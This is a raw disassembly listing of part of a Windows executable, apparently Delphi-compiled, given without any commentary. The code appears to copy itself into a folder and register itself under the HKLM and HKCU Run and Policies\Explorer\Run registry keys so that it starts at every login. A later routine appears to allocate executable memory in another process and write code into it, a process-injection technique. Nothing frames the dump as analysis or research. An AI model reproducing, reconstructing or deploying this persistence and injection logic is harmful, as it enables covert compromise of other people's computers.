  408343:	64 89 20             	mov    %esp,%fs:(%eax)
  408346:	8b c3                	mov    %ebx,%eax
  408348:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40834b:	e8 54 b4 ff ff       	call   0x4037a4
  408350:	a1 f4 a0 40 00       	mov    0x40a0f4,%eax
  408355:	83 38 00             	cmpl   $0x0,(%eax)
  408358:	75 0d                	jne    0x408367
  40835a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40835d:	e8 ce e1 ff ff       	call   0x406530
  408362:	e9 98 00 00 00       	jmp    0x4083ff
  408367:	a1 f4 a0 40 00       	mov    0x40a0f4,%eax
  40836c:	83 38 01             	cmpl   $0x1,(%eax)
  40836f:	75 0d                	jne    0x40837e
  408371:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408374:	e8 43 e2 ff ff       	call   0x4065bc
  408379:	e9 81 00 00 00       	jmp    0x4083ff
  40837e:	a1 f4 a0 40 00       	mov    0x40a0f4,%eax
  408383:	83 38 02             	cmpl   $0x2,(%eax)
  408386:	75 0a                	jne    0x408392
  408388:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40838b:	e8 e4 e2 ff ff       	call   0x406674
  408390:	eb 6d                	jmp    0x4083ff
  408392:	a1 f4 a0 40 00       	mov    0x40a0f4,%eax
  408397:	83 38 03             	cmpl   $0x3,(%eax)
  40839a:	75 0a                	jne    0x4083a6
  40839c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40839f:	e8 78 e4 ff ff       	call   0x40681c
  4083a4:	eb 59                	jmp    0x4083ff
  4083a6:	a1 1c a1 40 00       	mov    0x40a11c,%eax
  4083ab:	8b 00                	mov    (%eax),%eax
  4083ad:	e8 12 b5 ff ff       	call   0x4038c4
  4083b2:	8b 15 1c a1 40 00    	mov    0x40a11c,%edx
  4083b8:	8b 12                	mov    (%edx),%edx
  4083ba:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  4083bf:	74 14                	je     0x4083d5
  4083c1:	a1 1c a1 40 00       	mov    0x40a11c,%eax
  4083c6:	ba 3c 88 40 00       	mov    $0x40883c,%edx
  4083cb:	e8 fc b4 ff ff       	call   0x4038cc
  4083d0:	a1 1c a1 40 00       	mov    0x40a11c,%eax
  4083d5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4083d8:	8b 15 1c a1 40 00    	mov    0x40a11c,%edx
  4083de:	8b 12                	mov    (%edx),%edx
  4083e0:	e8 03 b4 ff ff       	call   0x4037e8
  4083e5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4083e8:	e8 d7 b6 ff ff       	call   0x403ac4
  4083ed:	8b d0                	mov    %eax,%edx
  4083ef:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4083f2:	e8 79 b4 ff ff       	call   0x403870
  4083f7:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4083fa:	e8 c5 e8 ff ff       	call   0x406cc4
  4083ff:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408402:	e8 bd b4 ff ff       	call   0x4038c4
  408407:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40840a:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  40840f:	74 0d                	je     0x40841e
  408411:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408414:	ba 3c 88 40 00       	mov    $0x40883c,%edx
  408419:	e8 ae b4 ff ff       	call   0x4038cc
  40841e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408421:	8b 15 0c a1 40 00    	mov    0x40a10c,%edx
  408427:	8b 12                	mov    (%edx),%edx
  408429:	e8 9e b4 ff ff       	call   0x4038cc
  40842e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408431:	e8 8e b4 ff ff       	call   0x4038c4
  408436:	8b 55 f8             	mov    -0x8(%ebp),%edx
  408439:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  40843e:	74 0d                	je     0x40844d
  408440:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408443:	ba 3c 88 40 00       	mov    $0x40883c,%edx
  408448:	e8 7f b4 ff ff       	call   0x4038cc
  40844d:	8b 0d 10 a1 40 00    	mov    0x40a110,%ecx
  408453:	8b 09                	mov    (%ecx),%ecx
  408455:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408458:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40845b:	e8 b0 b4 ff ff       	call   0x403910
  408460:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408463:	e8 5c b6 ff ff       	call   0x403ac4
  408468:	8b d0                	mov    %eax,%edx
  40846a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40846d:	e8 fe b3 ff ff       	call   0x403870
  408472:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408475:	e8 4a e8 ff ff       	call   0x406cc4
  40847a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40847d:	e8 42 b6 ff ff       	call   0x403ac4
  408482:	8b d0                	mov    %eax,%edx
  408484:	8d 45 e0             	lea    -0x20(%ebp),%eax
  408487:	e8 e4 b3 ff ff       	call   0x403870
  40848c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40848f:	e8 74 db ff ff       	call   0x406008
  408494:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408497:	e8 30 dd ff ff       	call   0x4061cc
  40849c:	ff 75 dc             	push   -0x24(%ebp)
  40849f:	68 3c 88 40 00       	push   $0x40883c
  4084a4:	a1 0c a1 40 00       	mov    0x40a10c,%eax
  4084a9:	ff 30                	push   (%eax)
  4084ab:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4084ae:	ba 03 00 00 00       	mov    $0x3,%edx
  4084b3:	e8 cc b4 ff ff       	call   0x403984
  4084b8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4084bb:	e8 04 b4 ff ff       	call   0x4038c4
  4084c0:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4084c3:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  4084c8:	74 0d                	je     0x4084d7
  4084ca:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4084cd:	ba 3c 88 40 00       	mov    $0x40883c,%edx
  4084d2:	e8 f5 b3 ff ff       	call   0x4038cc
  4084d7:	8b 0d 10 a1 40 00    	mov    0x40a110,%ecx
  4084dd:	8b 09                	mov    (%ecx),%ecx
  4084df:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4084e2:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4084e5:	e8 26 b4 ff ff       	call   0x403910
  4084ea:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4084ed:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4084f0:	e8 63 ec ff ff       	call   0x407158
  4084f5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4084f8:	50                   	push   %eax
  4084f9:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4084fc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4084ff:	e8 54 ec ff ff       	call   0x407158
  408504:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  408507:	58                   	pop    %eax
  408508:	e8 03 b5 ff ff       	call   0x403a10
  40850d:	74 25                	je     0x408534
  40850f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  408512:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408515:	e8 3e ec ff ff       	call   0x407158
  40851a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40851d:	50                   	push   %eax
  40851e:	8d 55 cc             	lea    -0x34(%ebp),%edx
  408521:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408524:	e8 2f ec ff ff       	call   0x407158
  408529:	8b 55 cc             	mov    -0x34(%ebp),%edx
  40852c:	58                   	pop    %eax
  40852d:	e8 de b4 ff ff       	call   0x403a10
  408532:	75 0f                	jne    0x408543
  408534:	8b c3                	mov    %ebx,%eax
  408536:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408539:	e8 66 b2 ff ff       	call   0x4037a4
  40853e:	e9 c7 02 00 00       	jmp    0x40880a
  408543:	6a 00                	push   $0x0
  408545:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408548:	e8 77 b5 ff ff       	call   0x403ac4
  40854d:	50                   	push   %eax
  40854e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408551:	e8 6e b5 ff ff       	call   0x403ac4
  408556:	8b f0                	mov    %eax,%esi
  408558:	56                   	push   %esi
  408559:	e8 f2 c5 ff ff       	call   0x404b50
  40855e:	83 f8 01             	cmp    $0x1,%eax
  408561:	1b c0                	sbb    %eax,%eax
  408563:	40                   	inc    %eax
  408564:	3c 01                	cmp    $0x1,%al
  408566:	75 0c                	jne    0x408574
  408568:	8b c3                	mov    %ebx,%eax
  40856a:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40856d:	e8 32 b2 ff ff       	call   0x4037a4
  408572:	eb 5f                	jmp    0x4085d3
  408574:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408577:	e8 48 b5 ff ff       	call   0x403ac4
  40857c:	8b d0                	mov    %eax,%edx
  40857e:	8d 45 c8             	lea    -0x38(%ebp),%eax
  408581:	e8 ea b2 ff ff       	call   0x403870
  408586:	8b 45 c8             	mov    -0x38(%ebp),%eax
  408589:	e8 36 e7 ff ff       	call   0x406cc4
  40858e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408591:	e8 2e b5 ff ff       	call   0x403ac4
  408596:	8b f8                	mov    %eax,%edi
  408598:	8b d7                	mov    %edi,%edx
  40859a:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40859d:	e8 ce b2 ff ff       	call   0x403870
  4085a2:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4085a5:	e8 5e da ff ff       	call   0x406008
  4085aa:	6a 00                	push   $0x0
  4085ac:	57                   	push   %edi
  4085ad:	56                   	push   %esi
  4085ae:	e8 9d c5 ff ff       	call   0x404b50
  4085b3:	83 f8 01             	cmp    $0x1,%eax
  4085b6:	1b c0                	sbb    %eax,%eax
  4085b8:	40                   	inc    %eax
  4085b9:	3c 01                	cmp    $0x1,%al
  4085bb:	75 0c                	jne    0x4085c9
  4085bd:	8b c3                	mov    %ebx,%eax
  4085bf:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4085c2:	e8 dd b1 ff ff       	call   0x4037a4
  4085c7:	eb 0a                	jmp    0x4085d3
  4085c9:	8b c3                	mov    %ebx,%eax
  4085cb:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4085ce:	e8 d1 b1 ff ff       	call   0x4037a4
  4085d3:	a1 f0 a0 40 00       	mov    0x40a0f0,%eax
  4085d8:	83 38 00             	cmpl   $0x0,(%eax)
  4085db:	0f 84 ee 00 00 00    	je     0x4086cf
  4085e1:	6a 00                	push   $0x0
  4085e3:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4085e6:	50                   	push   %eax
  4085e7:	a1 f0 a0 40 00       	mov    0x40a0f0,%eax
  4085ec:	8b 00                	mov    (%eax),%eax
  4085ee:	e8 d1 b4 ff ff       	call   0x403ac4
  4085f3:	8b d0                	mov    %eax,%edx
  4085f5:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4085f8:	e8 73 b2 ff ff       	call   0x403870
  4085fd:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  408600:	ba 48 88 40 00       	mov    $0x408848,%edx
  408605:	b8 02 00 00 80       	mov    $0x80000002,%eax
  40860a:	e8 b9 e0 ff ff       	call   0x4066c8
  40860f:	8b 45 c0             	mov    -0x40(%ebp),%eax
  408612:	8b 13                	mov    (%ebx),%edx
  408614:	e8 f7 b3 ff ff       	call   0x403a10
  408619:	74 3d                	je     0x408658
  40861b:	8b 03                	mov    (%ebx),%eax
  40861d:	e8 a2 b4 ff ff       	call   0x403ac4
  408622:	8b d0                	mov    %eax,%edx
  408624:	8d 45 b8             	lea    -0x48(%ebp),%eax
  408627:	e8 44 b2 ff ff       	call   0x403870
  40862c:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40862f:	50                   	push   %eax
  408630:	a1 f0 a0 40 00       	mov    0x40a0f0,%eax
  408635:	8b 00                	mov    (%eax),%eax
  408637:	e8 88 b4 ff ff       	call   0x403ac4
  40863c:	8b d0                	mov    %eax,%edx
  40863e:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  408641:	e8 2a b2 ff ff       	call   0x403870
  408646:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  408649:	ba 48 88 40 00       	mov    $0x408848,%edx
  40864e:	b8 02 00 00 80       	mov    $0x80000002,%eax
  408653:	e8 34 dc ff ff       	call   0x40628c
  408658:	6a 00                	push   $0x0
  40865a:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40865d:	50                   	push   %eax
  40865e:	a1 f0 a0 40 00       	mov    0x40a0f0,%eax
  408663:	8b 00                	mov    (%eax),%eax
  408665:	e8 5a b4 ff ff       	call   0x403ac4
  40866a:	8b d0                	mov    %eax,%edx
  40866c:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40866f:	e8 fc b1 ff ff       	call   0x403870
  408674:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  408677:	ba 48 88 40 00       	mov    $0x408848,%edx
  40867c:	b8 01 00 00 80       	mov    $0x80000001,%eax
  408681:	e8 42 e0 ff ff       	call   0x4066c8
  408686:	8b 45 b0             	mov    -0x50(%ebp),%eax
  408689:	8b 13                	mov    (%ebx),%edx
  40868b:	e8 80 b3 ff ff       	call   0x403a10
  408690:	74 3d                	je     0x4086cf
  408692:	8b 03                	mov    (%ebx),%eax
  408694:	e8 2b b4 ff ff       	call   0x403ac4
  408699:	8b d0                	mov    %eax,%edx
  40869b:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40869e:	e8 cd b1 ff ff       	call   0x403870
  4086a3:	8b 45 a8             	mov    -0x58(%ebp),%eax
  4086a6:	50                   	push   %eax
  4086a7:	a1 f0 a0 40 00       	mov    0x40a0f0,%eax
  4086ac:	8b 00                	mov    (%eax),%eax
  4086ae:	e8 11 b4 ff ff       	call   0x403ac4
  4086b3:	8b d0                	mov    %eax,%edx
  4086b5:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4086b8:	e8 b3 b1 ff ff       	call   0x403870
  4086bd:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  4086c0:	ba 48 88 40 00       	mov    $0x408848,%edx
  4086c5:	b8 01 00 00 80       	mov    $0x80000001,%eax
  4086ca:	e8 bd db ff ff       	call   0x40628c
  4086cf:	a1 dc a0 40 00       	mov    0x40a0dc,%eax
  4086d4:	83 38 00             	cmpl   $0x0,(%eax)
  4086d7:	74 77                	je     0x408750
  4086d9:	6a 00                	push   $0x0
  4086db:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4086de:	50                   	push   %eax
  4086df:	a1 dc a0 40 00       	mov    0x40a0dc,%eax
  4086e4:	8b 00                	mov    (%eax),%eax
  4086e6:	e8 d9 b3 ff ff       	call   0x403ac4
  4086eb:	8b d0                	mov    %eax,%edx
  4086ed:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4086f0:	e8 7b b1 ff ff       	call   0x403870
  4086f5:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  4086f8:	ba 90 88 40 00       	mov    $0x408890,%edx
  4086fd:	b8 02 00 00 80       	mov    $0x80000002,%eax
  408702:	e8 c1 df ff ff       	call   0x4066c8
  408707:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40870a:	8b 13                	mov    (%ebx),%edx
  40870c:	e8 ff b2 ff ff       	call   0x403a10
  408711:	74 3d                	je     0x408750
  408713:	8b 03                	mov    (%ebx),%eax
  408715:	e8 aa b3 ff ff       	call   0x403ac4
  40871a:	8b d0                	mov    %eax,%edx
  40871c:	8d 45 98             	lea    -0x68(%ebp),%eax
  40871f:	e8 4c b1 ff ff       	call   0x403870
  408724:	8b 45 98             	mov    -0x68(%ebp),%eax
  408727:	50                   	push   %eax
  408728:	a1 dc a0 40 00       	mov    0x40a0dc,%eax
  40872d:	8b 00                	mov    (%eax),%eax
  40872f:	e8 90 b3 ff ff       	call   0x403ac4
  408734:	8b d0                	mov    %eax,%edx
  408736:	8d 45 94             	lea    -0x6c(%ebp),%eax
  408739:	e8 32 b1 ff ff       	call   0x403870
  40873e:	8b 4d 94             	mov    -0x6c(%ebp),%ecx
  408741:	ba 90 88 40 00       	mov    $0x408890,%edx
  408746:	b8 02 00 00 80       	mov    $0x80000002,%eax
  40874b:	e8 3c db ff ff       	call   0x40628c
  408750:	a1 e4 a0 40 00       	mov    0x40a0e4,%eax
  408755:	83 38 00             	cmpl   $0x0,(%eax)
  408758:	74 77                	je     0x4087d1
  40875a:	6a 00                	push   $0x0
  40875c:	8d 45 90             	lea    -0x70(%ebp),%eax
  40875f:	50                   	push   %eax
  408760:	a1 e4 a0 40 00       	mov    0x40a0e4,%eax
  408765:	8b 00                	mov    (%eax),%eax
  408767:	e8 58 b3 ff ff       	call   0x403ac4
  40876c:	8b d0                	mov    %eax,%edx
  40876e:	8d 45 8c             	lea    -0x74(%ebp),%eax
  408771:	e8 fa b0 ff ff       	call   0x403870
  408776:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  408779:	ba 90 88 40 00       	mov    $0x408890,%edx
  40877e:	b8 01 00 00 80       	mov    $0x80000001,%eax
  408783:	e8 40 df ff ff       	call   0x4066c8
  408788:	8b 45 90             	mov    -0x70(%ebp),%eax
  40878b:	8b 13                	mov    (%ebx),%edx
  40878d:	e8 7e b2 ff ff       	call   0x403a10
  408792:	74 3d                	je     0x4087d1
  408794:	8b 03                	mov    (%ebx),%eax
  408796:	e8 29 b3 ff ff       	call   0x403ac4
  40879b:	8b d0                	mov    %eax,%edx
  40879d:	8d 45 88             	lea    -0x78(%ebp),%eax
  4087a0:	e8 cb b0 ff ff       	call   0x403870
  4087a5:	8b 45 88             	mov    -0x78(%ebp),%eax
  4087a8:	50                   	push   %eax
  4087a9:	a1 e4 a0 40 00       	mov    0x40a0e4,%eax
  4087ae:	8b 00                	mov    (%eax),%eax
  4087b0:	e8 0f b3 ff ff       	call   0x403ac4
  4087b5:	8b d0                	mov    %eax,%edx
  4087b7:	8d 45 84             	lea    -0x7c(%ebp),%eax
  4087ba:	e8 b1 b0 ff ff       	call   0x403870
  4087bf:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  4087c2:	ba 90 88 40 00       	mov    $0x408890,%edx
  4087c7:	b8 01 00 00 80       	mov    $0x80000001,%eax
  4087cc:	e8 bb da ff ff       	call   0x40628c
  4087d1:	a1 e8 a0 40 00       	mov    0x40a0e8,%eax
  4087d6:	83 38 00             	cmpl   $0x0,(%eax)
  4087d9:	74 2f                	je     0x40880a
  4087db:	68 c0 88 40 00       	push   $0x4088c0
  4087e0:	b2 01                	mov    $0x1,%dl
  4087e2:	a1 ac 7f 40 00       	mov    0x407fac,%eax
  4087e7:	e8 18 f8 ff ff       	call   0x408004
  4087ec:	50                   	push   %eax
  4087ed:	8b 03                	mov    (%ebx),%eax
  4087ef:	e8 d0 b2 ff ff       	call   0x403ac4
  4087f4:	50                   	push   %eax
  4087f5:	a1 e8 a0 40 00       	mov    0x40a0e8,%eax
  4087fa:	8b 00                	mov    (%eax),%eax
  4087fc:	e8 c3 b2 ff ff       	call   0x403ac4
  408801:	8b d0                	mov    %eax,%edx
  408803:	59                   	pop    %ecx
  408804:	58                   	pop    %eax
  408805:	e8 96 fa ff ff       	call   0x4082a0
  40880a:	33 c0                	xor    %eax,%eax
  40880c:	5a                   	pop    %edx
  40880d:	59                   	pop    %ecx
  40880e:	59                   	pop    %ecx
  40880f:	64 89 10             	mov    %edx,%fs:(%eax)
  408812:	68 2c 88 40 00       	push   $0x40882c
  408817:	8d 45 84             	lea    -0x7c(%ebp),%eax
  40881a:	ba 1f 00 00 00       	mov    $0x1f,%edx
  40881f:	e8 50 af ff ff       	call   0x403774
  408824:	c3                   	ret
  408825:	e9 9a a9 ff ff       	jmp    0x4031c4
  40882a:	eb eb                	jmp    0x408817
  40882c:	5f                   	pop    %edi
  40882d:	5e                   	pop    %esi
  40882e:	5b                   	pop    %ebx
  40882f:	8b e5                	mov    %ebp,%esp
  408831:	5d                   	pop    %ebp
  408832:	c3                   	ret
  408833:	00 ff                	add    %bh,%bh
  408835:	ff                   	(bad)
  408836:	ff                   	(bad)
  408837:	ff 01                	incl   (%ecx)
  408839:	00 00                	add    %al,(%eax)
  40883b:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  40883f:	00 ff                	add    %bh,%bh
  408841:	ff                   	(bad)
  408842:	ff                   	(bad)
  408843:	ff                   	(bad)
  408844:	3f                   	aas
  408845:	00 00                	add    %al,(%eax)
  408847:	00 53 6f             	add    %dl,0x6f(%ebx)
  40884a:	66 74 77             	data16 je 0x4088c4
  40884d:	61                   	popa
  40884e:	72 65                	jb     0x4088b5
  408850:	5c                   	pop    %esp
  408851:	4d                   	dec    %ebp
  408852:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408859:	74 5c                	je     0x4088b7
  40885b:	57                   	push   %edi
  40885c:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  408863:	43                   	inc    %ebx
  408864:	75 72                	jne    0x4088d8
  408866:	72 65                	jb     0x4088cd
  408868:	6e                   	outsb  %ds:(%esi),(%dx)
  408869:	74 56                	je     0x4088c1
  40886b:	65 72 73             	gs jb  0x4088e1
  40886e:	69 6f 6e 5c 50 6f 6c 	imul   $0x6c6f505c,0x6e(%edi),%ebp
  408875:	69 63 69 65 73 5c 45 	imul   $0x455c7365,0x69(%ebx),%esp
  40887c:	78 70                	js     0x4088ee
  40887e:	6c                   	insb   (%dx),%es:(%edi)
  40887f:	6f                   	outsl  %ds:(%esi),(%dx)
  408880:	72 65                	jb     0x4088e7
  408882:	72 5c                	jb     0x4088e0
  408884:	52                   	push   %edx
  408885:	75 6e                	jne    0x4088f5
  408887:	00 ff                	add    %bh,%bh
  408889:	ff                   	(bad)
  40888a:	ff                   	(bad)
  40888b:	ff 2d 00 00 00 53    	ljmp   *0x53000000
  408891:	6f                   	outsl  %ds:(%esi),(%dx)
  408892:	66 74 77             	data16 je 0x40890c
  408895:	61                   	popa
  408896:	72 65                	jb     0x4088fd
  408898:	5c                   	pop    %esp
  408899:	4d                   	dec    %ebp
  40889a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4088a1:	74 5c                	je     0x4088ff
  4088a3:	57                   	push   %edi
  4088a4:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  4088ab:	43                   	inc    %ebx
  4088ac:	75 72                	jne    0x408920
  4088ae:	72 65                	jb     0x408915
  4088b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b1:	74 56                	je     0x408909
  4088b3:	65 72 73             	gs jb  0x408929
  4088b6:	69 6f 6e 5c 52 75 6e 	imul   $0x6e75525c,0x6e(%edi),%ebp
  4088bd:	00 00                	add    %al,(%eax)
  4088bf:	00 00                	add    %al,(%eax)
  4088c1:	00 00                	add    %al,(%eax)
  4088c3:	00 55 8b             	add    %dl,-0x75(%ebp)
  4088c6:	ec                   	in     (%dx),%al
  4088c7:	33 c0                	xor    %eax,%eax
  4088c9:	55                   	push   %ebp
  4088ca:	68 e9 88 40 00       	push   $0x4088e9
  4088cf:	64 ff 30             	push   %fs:(%eax)
  4088d2:	64 89 20             	mov    %esp,%fs:(%eax)
  4088d5:	ff 05 7c b9 40 00    	incl   0x40b97c
  4088db:	33 c0                	xor    %eax,%eax
  4088dd:	5a                   	pop    %edx
  4088de:	59                   	pop    %ecx
  4088df:	59                   	pop    %ecx
  4088e0:	64 89 10             	mov    %edx,%fs:(%eax)
  4088e3:	68 f0 88 40 00       	push   $0x4088f0
  4088e8:	c3                   	ret
  4088e9:	e9 d6 a8 ff ff       	jmp    0x4031c4
  4088ee:	eb f8                	jmp    0x4088e8
  4088f0:	5d                   	pop    %ebp
  4088f1:	c3                   	ret
  4088f2:	8b c0                	mov    %eax,%eax
  4088f4:	83 2d 7c b9 40 00 01 	subl   $0x1,0x40b97c
  4088fb:	c3                   	ret
  4088fc:	55                   	push   %ebp
  4088fd:	8b ec                	mov    %esp,%ebp
  4088ff:	83 c4 f0             	add    $0xfffffff0,%esp
  408902:	56                   	push   %esi
  408903:	57                   	push   %edi
  408904:	8b 45 08             	mov    0x8(%ebp),%eax
  408907:	8b f0                	mov    %eax,%esi
  408909:	8d 7d f0             	lea    -0x10(%ebp),%edi
  40890c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40890d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40890e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40890f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408910:	68 e8 03 00 00       	push   $0x3e8
  408915:	ff 55 f8             	call   *-0x8(%ebp)
  408918:	ff 75 fc             	push   -0x4(%ebp)
  40891b:	ff 55 f0             	call   *-0x10(%ebp)
  40891e:	83 f8 00             	cmp    $0x0,%eax
  408921:	74 ed                	je     0x408910
  408923:	6a 00                	push   $0x0
  408925:	ff 55 f4             	call   *-0xc(%ebp)
  408928:	5f                   	pop    %edi
  408929:	5e                   	pop    %esi
  40892a:	8b e5                	mov    %ebp,%esp
  40892c:	5d                   	pop    %ebp
  40892d:	c2 04 00             	ret    $0x4
  408930:	55                   	push   %ebp
  408931:	8b ec                	mov    %esp,%ebp
  408933:	83 c4 dc             	add    $0xffffffdc,%esp
  408936:	53                   	push   %ebx
  408937:	56                   	push   %esi
  408938:	57                   	push   %edi
  408939:	33 d2                	xor    %edx,%edx
  40893b:	89 55 dc             	mov    %edx,-0x24(%ebp)
  40893e:	89 55 e0             	mov    %edx,-0x20(%ebp)
  408941:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  408944:	8b d8                	mov    %eax,%ebx
  408946:	33 c0                	xor    %eax,%eax
  408948:	55                   	push   %ebp
  408949:	68 8b 8a 40 00       	push   $0x408a8b
  40894e:	64 ff 30             	push   %fs:(%eax)
  408951:	64 89 20             	mov    %esp,%fs:(%eax)
  408954:	85 db                	test   %ebx,%ebx
  408956:	0f 84 14 01 00 00    	je     0x408a70
  40895c:	68 9c 8a 40 00       	push   $0x408a9c
  408961:	68 a8 8a 40 00       	push   $0x408aa8
  408966:	e8 85 c2 ff ff       	call   0x404bf0
  40896b:	50                   	push   %eax
  40896c:	e8 87 c2 ff ff       	call   0x404bf8
  408971:	89 45 e8             	mov    %eax,-0x18(%ebp)
  408974:	68 b8 8a 40 00       	push   $0x408ab8
  408979:	68 a8 8a 40 00       	push   $0x408aa8
  40897e:	e8 6d c2 ff ff       	call   0x404bf0
  408983:	50                   	push   %eax
  408984:	e8 6f c2 ff ff       	call   0x404bf8
  408989:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40898c:	68 c4 8a 40 00       	push   $0x408ac4
  408991:	68 a8 8a 40 00       	push   $0x408aa8
  408996:	e8 55 c2 ff ff       	call   0x404bf0
  40899b:	50                   	push   %eax
  40899c:	e8 57 c2 ff ff       	call   0x404bf8
  4089a1:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4089a4:	6a 40                	push   $0x40
  4089a6:	68 00 30 00 00       	push   $0x3000
  4089ab:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  4089ae:	33 c0                	xor    %eax,%eax
  4089b0:	e8 2f a1 ff ff       	call   0x402ae4
  4089b5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4089b8:	e8 07 af ff ff       	call   0x4038c4
  4089bd:	40                   	inc    %eax
  4089be:	50                   	push   %eax
  4089bf:	6a 00                	push   $0x0
  4089c1:	53                   	push   %ebx
  4089c2:	e8 91 c2 ff ff       	call   0x404c58
  4089c7:	8b f0                	mov    %eax,%esi
  4089c9:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4089cc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4089cf:	50                   	push   %eax
  4089d0:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4089d3:	33 c0                	xor    %eax,%eax
  4089d5:	e8 0a a1 ff ff       	call   0x402ae4
  4089da:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4089dd:	e8 e2 ae ff ff       	call   0x4038c4
  4089e2:	40                   	inc    %eax
  4089e3:	50                   	push   %eax
  4089e4:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4089e7:	33 c0                	xor    %eax,%eax
  4089e9:	e8 f6 a0 ff ff       	call   0x402ae4
  4089ee:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4089f1:	e8 ce b0 ff ff       	call   0x403ac4
  4089f6:	50                   	push   %eax
  4089f7:	56                   	push   %esi
  4089f8:	53                   	push   %ebx
  4089f9:	e8 82 c2 ff ff       	call   0x404c80
  4089fe:	6a 40                	push   $0x40
  408a00:	68 00 30 00 00       	push   $0x3000
  408a05:	6a 10                	push   $0x10
  408a07:	6a 00                	push   $0x0
  408a09:	53                   	push   %ebx
  408a0a:	e8 49 c2 ff ff       	call   0x404c58
  408a0f:	8b f0                	mov    %eax,%esi
  408a11:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408a14:	50                   	push   %eax
  408a15:	6a 10                	push   $0x10
  408a17:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408a1a:	50                   	push   %eax
  408a1b:	56                   	push   %esi
  408a1c:	53                   	push   %ebx
  408a1d:	e8 5e c2 ff ff       	call   0x404c80
  408a22:	83 7d fc 10          	cmpl   $0x10,-0x4(%ebp)
  408a26:	75 48                	jne    0x408a70
  408a28:	6a 40                	push   $0x40
